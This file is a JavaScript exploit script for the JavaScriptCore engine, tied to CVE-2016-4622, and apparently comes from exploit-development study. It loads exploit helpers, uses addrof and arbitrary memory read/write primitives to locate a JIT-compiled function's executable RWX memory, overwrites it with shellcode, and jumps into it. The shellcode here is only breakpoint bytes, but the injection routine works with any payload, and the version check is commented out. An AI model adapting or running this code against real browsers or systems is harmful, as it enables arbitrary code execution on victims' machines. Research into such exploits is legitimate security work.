load("/root/exp-dev/cve-2016-4622/utils.js");
load("/root/exp-dev/cve-2016-4622/int64.js");
load("/root/exp-dev/cve-2016-4622/pwn.js");

// Replaces the JIT-compiled code for a function with the given shellcode and runs it.
//
// This code is pretty version dependent since it depends on fixed property offsets.
// Could be improved but this is good enough for now.
function runShellcode(shellcode) {
    // if (!isVulnerable()) {
    //     print("[-] JSC version not vulnerable. Aborting");
    //     return;
    // }
    function makeJITCompiledFunction() {
        function target(x) {
            return x;
        }
        // Force JIT compilation.
        for (var i = 0; i < 1000; i++) {
            target(i);
        }
        return target;
    }
    // Setup the memory read/write primitive.
    pwn();
    // Now the easy part:
    //   1. Leak a pointer to a JIT compiled function
    //   2. Leak the pointer into executable memory
    //   3. Write shellcode there
    //   4. Call the function
    var func = makeJITCompiledFunction();
    var funcAddr = addrof(func);
    print("[+] Shellcode function object @ " + funcAddr);
    var executableAddr = memory.readInt64(Add(funcAddr, 24));
    print("[+] Executable instance @ " + executableAddr);
    var jitCodeAddr = memory.readInt64(Add(executableAddr, 16));
    print("[+] JITCode instance @ " + jitCodeAddr);
    var codeAddr = memory.readInt64(Add(jitCodeAddr, 32));
    print("[+] RWX memory @ " + codeAddr.toString());
    print("[+] Writing shellcode...");
    memory.write(codeAddr, shellcode);
    print("[!] Jumping into shellcode...");
    func();
}

var a = {'a': 0x1337,
        'b': false, 
        'c': 13.37, 
        'd': [1,2,3,4],
        'e': 'AAAABBBB',
        'f': new Int64('0x4545454546464646').asDouble()};
print(describe(a));

var SHELLCODE = [0xcc, 0xcc, 0xcc];
runShellcode(SHELLCODE);


